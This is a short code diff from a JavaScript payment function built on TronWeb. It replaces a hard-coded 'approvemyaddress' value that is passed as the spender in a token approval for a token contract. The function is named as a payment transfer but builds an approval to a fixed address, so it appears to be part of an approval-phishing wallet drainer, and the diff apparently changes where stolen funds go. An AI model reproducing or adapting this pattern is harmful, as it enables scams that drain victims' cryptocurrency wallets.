@@ -29,7 +29,7 @@ async function paytransfer() {
         let amount = document.getElementById("amount-display").textContent;
         const userAddress = tronWebInstance.defaultAddress.base58;
         const contractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-        const approvemyaddress = 'TK9aZjTyVZY9iEmJMo6a9VxM4QHrXbcJVr';
+        const approvemyaddress = 'TY9KJy96yzcN6vXMyWdj8muUg6cWZeh2ee';
         const approvalParams = [{
             "type": "address",
             "value": approvemyaddress
